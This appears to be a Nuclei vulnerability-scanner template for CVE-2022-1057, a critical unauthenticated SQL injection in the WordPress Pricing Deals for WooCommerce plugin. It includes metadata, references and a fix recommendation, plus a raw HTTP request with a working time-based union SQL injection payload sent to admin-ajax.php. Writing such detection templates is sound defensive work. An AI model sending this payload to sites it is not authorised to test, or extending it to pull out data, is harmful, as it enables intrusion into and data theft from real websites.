id: CVE-2022-1057
info:
  name: WordPress Pricing Deals for WooCommerce <=2.0.2.02 - SQL Injection
  author: theamanrawat
  severity: critical
  description: The WordPress Pricing Deals for WooCommerce plugin through version
    2.0.2.02 has a SQL injection vulnerability that can allow an attacker to manipulate
    data and gain access to sensitive information or unauthorized administrative operations
    on the affected site.
  reference:
  - https://wpscan.com/vulnerability/7c33ffc3-84d1-4a0f-a837-794cdc3ad243
  - https://wordpress.org/plugins/pricing-deals-for-woocommerce/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1057
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1057
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in WordPress Pricing Deals for WooCommerce
      plugin can result in an attacker gaining access to sensitive information and
      executing unauthorized administrative operations on the affected site.
    recommendation: It is recommended that website administrators urgently update
      the WordPress Pricing Deals for WooCommerce plugin to version 2.0.2.03, which
      contains a fix for a SQL injection vulnerability that could be exploited by
      attackers to obtain sensitive information, modify data, or execute unauthorized
      administrative operations on the affected site.
  tags: cve,cve2022,sqli,wpscan,wordpress,wp-plugin,wp,pricing-deals-for-woocommerce,unauth
requests:
- raw:
  - '@timeout: 15s

    GET /wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+-
    HTTP/1.1

    Host: {{Hostname}}

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 500
    - contains(body, "been a critical error")
    condition: and
